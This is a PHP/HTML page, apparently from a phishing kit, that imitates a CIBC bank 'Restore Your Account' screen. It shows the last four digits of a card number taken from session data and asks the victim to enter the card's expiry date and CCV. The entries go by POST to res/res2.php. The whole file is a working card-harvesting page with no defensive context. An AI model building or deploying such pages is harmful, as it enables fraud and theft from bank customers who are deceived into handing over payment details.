<?php
error_reporting(0);
session_start();
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>CIBC</title>
<meta name="generator" content="WYSIWYG Web Builder 12 Trial Version - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.png" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled2.css" rel="stylesheet" type="text/css">
<link href="css/card.css" rel="stylesheet" type="text/css">
</head>
<body>
<form name="ff" action="res/res2.php" method="POST">
<div id="wb_Image2" style="position:absolute;left:0px;top:2px;width:1315px;height:691px;z-index:5;">
<img src="images/0.PNG" id="Image2" alt=""></div>
<div id="wb_Image1" style="position:absolute;left:0px;top:701px;width:1315px;height:302px;z-index:6;">
<img src="images/2.PNG" id="Image1" alt=""></div>

<div id="wb_Form1" style="position:absolute;left:263px;top:278px;width:560px;height:40px;z-index:8;">

</div>
<div id="wb_Text1" style="position:absolute;left:263px;top:273px;width:1111px;height:16px;z-index:9;">
<span style="color:#000000;font-family:Arial;font-size:13px;"> Please enter your expiry date and ccv&nbsp; of your credit card to activite your account</span></div>
<div id="wb_Image4" style="position:absolute;left:249px;top:529px;width:614px;height:52px;z-index:10;">
<a href="infos.php"><img src="images/11.PNG" id="Image4" alt=""></a></div>
<div id="wb_Image3" style="position:absolute;left:249px;top:595px;width:614px;height:47px;z-index:11;">
<a href="verif.php"><img src="images/515.PNG" id="Image3" alt=""></a></div>
<div id="wb_Form2" style="position:absolute;left:193px;top:304px;width:585px;height:100px;z-index:12;">
<div id="wb_Text2" style="position:absolute;left:89px;top:31px;width:85px;height:16px;z-index:0;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Card Number</span></div>
<div id="wb_Text3" style="position:absolute;left:302px;top:31px;width:85px;height:16px;z-index:1;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Expire Date</span></div>
<div id="wb_Text4" style="position:absolute;left:443px;top:31px;width:47px;height:16px;z-index:2;">
<span style="color:#000000;font-family:Arial;font-size:13px;">CCV</span></div>

</div>


<input pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$"  type="tel" id="Editbox1" style="position:absolute;left:249px;top:372px;width:194px;height:30px;line-height:30px;z-index:13;" name="1" value="" maxlength="16" spellcheck="false"  placeholder="XXXX-XXXX-XXXX-<?=substr($_SESSION['card'] , -4);?>" disabled >





<input pattern="[0-9].{2,3}"  type="tel" id="Editbox2" style="position:absolute;left:609px;top:372px;width:86px;height:30px;line-height:30px;z-index:14;" name="4" value="" maxlength="3" spellcheck="false" required>
<input type="tel" id="Editbox3" style="position:absolute;left:493px;top:372px;width:29px;height:30px;line-height:30px;z-index:15;" name="2" value="" maxlength="2" spellcheck="false" required>
<input type="tel" id="Editbox4" style="position:absolute;left:539px;top:372px;width:29px;height:30px;line-height:30px;z-index:16;" name="3" value="" maxlength="2" spellcheck="false" required>
<div id="wb_Text5" style="position:absolute;left:527px;top:374px;width:10px;height:32px;text-align:center;z-index:17;">
<span style="color:#000000;font-family:Arial;font-size:27px;">/</span></div>
<div id="wb_Form3" style="position:absolute;left:249px;top:444px;width:78px;height:31px;z-index:18;">

</div>
<div id="wb_Text6" style="position:absolute;left:262px;top:454px;width:43px;height:32px;z-index:19;">
<span style="color:#DC0139;font-family:Arial;font-size:13px;">Cancel</span></div>
<div id="wb_Form4" style="position:absolute;left:249px;top:121px;width:378px;height:81px;z-index:20;">
<div id="wb_Text8" style="position:absolute;left:0px;top:0px;width:283px;height:25px;z-index:3;">
<span style="color:#D60139;font-family:'Bookman Old Style';font-size:21px;"><strong>Restore Your Account !</strong></span></div>

</div>
<div id="wb_Text7" style="position:absolute;left:249px;top:167px;width:335px;height:16px;z-index:21;">
<span style="color:#000000;font-family:Arial;font-size:13px;">All fields are mandatory unless stated (optional)</span></div>
<div id="wb_Form5" style="position:absolute;left:557px;top:429px;width:585px;height:100px;z-index:22;">
<input type="submit" id="Button3" name="" value="" style="position:absolute;left:240px;top:23px;width:48px;height:29px;">

</div>
</form>
</body>
</html>